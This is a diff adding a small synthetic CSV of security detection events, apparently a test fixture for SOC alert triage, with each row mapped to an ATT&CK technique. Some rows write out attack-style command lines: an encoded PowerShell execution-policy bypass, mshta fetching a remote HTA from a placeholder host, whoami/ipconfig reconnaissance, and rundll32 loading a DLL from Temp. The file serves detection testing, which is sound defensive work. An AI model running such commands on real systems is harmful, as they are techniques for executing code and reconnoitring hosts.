@@ -1,0 +1,7 @@
+timestamp,rule_id,severity,host,user,process,command_line,technique,disposition
+2026-09-25T08:00:00Z,DE-001,high,win-soc-01,CONTOSO\alice,powershell.exe,powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand SYNTHETIC_PAYLOAD_A,T1059.001,alert
+2026-09-25T08:01:00Z,DE-002,medium,win-soc-01,CONTOSO\bob,mshta.exe,mshta.exe https://example.invalid/update.hta,T1218.005,alert
+2026-09-25T08:02:00Z,DE-003,high,win-soc-01,CONTOSO\alice,cmd.exe,cmd.exe /c whoami && ipconfig /all,T1059.003,alert
+2026-09-25T08:03:00Z,DE-004,low,win-soc-01,CONTOSO\svc_backup,robocopy.exe,robocopy C:\data D:\backup /E,T1074.001,suppress
+2026-09-25T08:04:00Z,DE-005,medium,win-soc-01,CONTOSO\dave,rundll32.exe,"rundll32.exe C:\Temp\demo.dll,EntryPoint",T1218.011,alert
+2026-09-25T08:05:00Z,DE-006,low,win-soc-01,CONTOSO\alice,notepad.exe,notepad.exe C:\Temp\notes.txt,T1204.002,benign
